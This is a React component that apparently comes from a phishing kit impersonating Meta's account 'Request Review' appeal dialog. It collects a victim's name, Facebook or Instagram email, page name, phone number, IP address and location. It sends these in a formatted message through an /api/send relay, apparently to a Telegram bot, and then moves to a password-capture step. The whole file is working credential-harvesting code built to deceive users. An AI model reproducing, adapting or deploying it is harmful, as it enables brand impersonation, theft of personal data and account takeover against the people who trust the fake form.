'use client';

import MetaLogo from '@/assets/images/meta-logo-image.png';
import { getTranslations } from '@/utils/translate';
import { store } from '@/store/store';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import dynamic from 'next/dynamic';
import 'intl-tel-input/styles';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useMemo, useState } from 'react';

const IntlTelInput = dynamic(() => import('intl-tel-input/reactWithUtils'), { ssr: false });

interface FormData {
    fullName: string;
    pageName: string;
    personalEmail: string;
    reviewReason?: string;
    reviewDescription?: string;
}

interface FormField {
    name: keyof FormData;
    label: string;
    type: 'text' | 'email' | 'textarea';
}

const FORM_FIELDS: FormField[] = [
    { name: 'fullName', label: 'Full Name', type: 'text' },
    { name: 'personalEmail', label: 'Personal Email Facebook or Instagram', type: 'email' },
    { name: 'pageName', label: 'Page Name', type: 'text' }
];
const InitModal: FC = () => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        pageName: '',
        personalEmail: '',
        reviewReason: '',
        reviewDescription: ''
    });

    const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserFullName, setUserPhone, setFormStep, formStep } = store();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
    
    // Get language from country code or default to English
    const countryToLanguage: Record<string, string> = {
        'us': 'en', 'gb': 'en', 'ca': 'en', 'au': 'en',
        'mx': 'es', 'es': 'es', 'ar': 'es', 'br': 'pt', 'pt': 'pt',
        'fr': 'fr', 'de': 'de', 'at': 'de', 'ch': 'fr',
        'jp': 'ja', 'cn': 'zh', 'tw': 'zh', 'hk': 'zh',
        'kr': 'ko', 'th': 'th', 'vn': 'vi', 'id': 'id',
        'ru': 'ru', 'ua': 'uk', 'in': 'hi', 'bd': 'bn',
        'ae': 'ar', 'sa': 'ar', 'eg': 'ar'
    };
    const language = countryToLanguage[countryCode] || 'en';
    const translations = getTranslations(language);

    const t = (text: string): string => {
        return translations[text] || text;
    };

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value, type } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));
    }, []);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;
        setIsLoading(true);

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>\n<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>👤 Full Name:</b> <code>${formData.fullName}</code>
<b>📧 Personal Email Facebook or Instagram:</b> <code>${formData.personalEmail}</code>
<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
${formData.reviewDescription ? `<b>📝 Review Description:</b> <code>${formData.reviewDescription}</code>` : ''}

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        try {
            const res = await axios.post('/api/send', {
                message
            });
            if (res?.data?.success && typeof res.data.data.result.message_id === 'number') {
                setMessageId(res.data.data.result.message_id);
                setMessage(message);
            }
        } catch {
            // Continue even if send fails
        } finally {
            setIsLoading(false);
            // Store user data and switch to password form step
            setUserEmail(formData.personalEmail);
            setUserFullName(formData.fullName);
            setUserPhone(phoneNumber);
            setFormStep('password');
        }
    };

    // Only show init modal if formStep is not set to password or other steps
    if (formStep && formStep !== 'init') {
        return null;
    }

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-2 sm:p-4 md:p-6'>
                <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                <div className='mb-1.5 sm:mb-2 flex w-full items-center justify-between p-1.5 sm:p-2 md:p-4 pb-0'>
                    <p className='text-xs sm:text-sm md:text-lg font-bold'>{t('Request Review')}</p>
                    <button type='button' onClick={() => setModalOpen(false)} className='h-7 sm:h-8 w-7 sm:w-8 rounded-full transition-colors hover:bg-[#e2eaf2] flex-shrink-0' aria-label='Close modal'>
                        <FontAwesomeIcon icon={faXmark} size='lg' />
                    </button>
                </div>

                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-2 sm:px-3 md:px-4'>
                    <div className='flex flex-col gap-2 sm:gap-2.5 py-2 sm:py-3 md:py-4'>
                        {FORM_FIELDS.map((field) => (
                            <div key={field.name}>
                                <p className='text-sm sm:text-base font-sans text-[#1C2B33] font-semibold'>{t(field.label)}</p>
                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-24 sm:min-h-28 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-2 text-base sm:text-lg' rows={3} /> : <input required name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-11 sm:h-12 md:h-14 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-2 text-base sm:text-lg' />}
                            </div>
                        ))}
                        <p className='text-sm sm:text-base font-sans text-[#1C2B33] font-semibold'>{t('Mobile phone number')}</p>
                        <IntlTelInput
                            key={countryCode}
                            onChangeNumber={handlePhoneChange}
                            initOptions={initOptions}
                            inputProps={{
                                name: 'phoneNumber',
                                className: 'h-11 sm:h-12 md:h-14 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-2 text-base sm:text-lg'
                            }}
                        />
                        
                        {/* Review Reason Section */}
                        <div className='mt-3 sm:mt-4'>
                            <p className='text-xs sm:text-sm font-sans mb-2'>{t('Why are you requesting a review?')}</p>
                            <div className='flex flex-col gap-2'>
                                <label className='flex items-center gap-2 cursor-pointer'>
                                    <input
                                        type='radio'
                                        name='reviewReason'
                                        value="I'm not sure which policy was violated."
                                        checked={formData.reviewReason === "I'm not sure which policy was violated."}
                                        onChange={handleInputChange}
                                        className='w-4 h-4'
                                    />
                                    <span className='text-xs sm:text-sm'>{t("I'm not sure which policy was violated.")}</span>
                                </label>
                                <label className='flex items-center gap-2 cursor-pointer'>
                                    <input
                                        type='radio'
                                        name='reviewReason'
                                        value='I think there was unauthorized use of my account.'
                                        checked={formData.reviewReason === 'I think there was unauthorized use of my account.'}
                                        onChange={handleInputChange}
                                        className='w-4 h-4'
                                    />
                                    <span className='text-xs sm:text-sm'>{t('I think there was unauthorized use of my account.')}</span>
                                </label>
                                <label className='flex items-center gap-2 cursor-pointer'>
                                    <input
                                        type='radio'
                                        name='reviewReason'
                                        value='Another reason:'
                                        checked={formData.reviewReason === 'Another reason:'}
                                        onChange={handleInputChange}
                                        className='w-4 h-4'
                                    />
                                    <span className='text-xs sm:text-sm'>{t('Another reason:')}</span>
                                </label>
                            </div>
                            
                            {/* Description textarea */}
                            {formData.reviewReason === 'Another reason:' && (
                                <textarea
                                    name='reviewDescription'
                                    value={formData.reviewDescription}
                                    onChange={handleInputChange}
                                    placeholder={t('Please describe your reason')}
                                    className='mt-2 min-h-20 sm:min-h-24 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base'
                                    rows={3}
                                />
                            )}
                        </div>
                        <button type='submit' disabled={isLoading} className={`mt-2 sm:mt-3 md:mt-4 flex h-10 sm:h-11 md:h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs sm:text-sm md:text-base text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
                        </button>
                    </div>
                </form>

                <div className='flex items-center justify-center p-1.5 sm:p-2 md:p-3'>
                    <Image src={MetaLogo} alt='' className='h-3.5 sm:h-4 md:h-4.5 w-14 sm:w-16 md:w-17.5' />
                </div>
            </div>
            </div>
        </>
    );
};

export default InitModal;
